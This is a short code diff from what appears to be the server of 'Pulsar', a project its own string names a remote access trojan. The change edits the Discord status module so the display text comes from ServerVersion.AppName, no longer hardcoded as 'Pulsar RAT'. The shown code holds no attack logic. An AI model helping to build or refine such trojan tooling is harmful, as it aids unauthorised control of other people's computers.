@@ -1,4 +1,5 @@
-﻿using DiscordRPC;
+using DiscordRPC;
+using Pulsar.Server.Utilities;
 using System;
 using System.Diagnostics;
 using System.Windows.Forms;
@@ -122,7 +123,7 @@ namespace Pulsar.Server.DiscordRPC
                 Assets = new Assets
                 {
                     LargeImageKey = "default",
-                    LargeImageText = "Pulsar RAT"
+                    LargeImageText = ServerVersion.AppName
                 },
                 Timestamps = new Timestamps { Start = DateTime.UtcNow }
             });
